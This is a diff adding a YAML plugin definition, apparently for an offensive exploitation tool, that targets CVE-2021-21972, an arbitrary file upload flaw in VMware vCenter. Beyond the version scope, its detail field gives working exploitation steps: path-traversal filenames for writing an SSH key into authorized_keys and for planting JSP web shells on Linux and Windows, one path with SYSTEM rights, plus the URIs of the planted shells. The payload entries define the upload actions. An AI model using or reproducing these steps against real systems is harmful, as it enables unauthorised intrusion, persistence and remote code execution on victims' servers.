@@ -1,0 +1,42 @@
+info:
+    app: vcenter
+    name: CVE-2021-21972
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2021-02-24"
+    create_date: "2024-10-06 09:13:16"
+    update_date: "2024-10-06 09:13:16"
+    scope: |-
+        vmware:vcenter_server 7.0 U1c 之前的 7.0 版本
+        vmware:vcenter_server 6.7 U3l 之前的 6.7 版本
+        vmware:vcenter_server 6.5 U3n 之前的 6.5 版本
+    description: /ui/vropspluginui/rest/services/uploadova存在任意文件上传漏洞
+    vul_id: CVE-2021-21972
+    detail: "linux: \n\t找路径输入: findpath\n\t写公钥 ../../home/vsphere-ui/.ssh/authorized_keys\n\t写shell \n\t\t../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/40/0/h5ngc.war/resources/test.jsp\n\t\t../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/test.jsp\n\t\t对应URI /ui/resources/test.jsp\nwindows:\n\t写shell\n\t\t..\\..\\ProgramData\\VMware\\vCenterServer\\runtime\\vsphere-ui\\server\\work\\deployer\\s\\global\\42\\0\\h5ngc.war\\resources\\test.jsp\n\t\t对应URI /ui/resources/test.jsp\n\t\t与linux不同之处，下面路径windows可写，并且为system权限\n\t\t..\\..\\ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\statsreport\\test.jsp\n\t\t对应URI /statsreport/test.jsp"
+payloads:
+    - name: getmsg1
+      alias: 获取信息
+    - name: upload1
+      alias: 文件上传1
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: findpath
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: ""
+    - name: upload2
+      alias: 文件上传2
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: findpath
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: ""
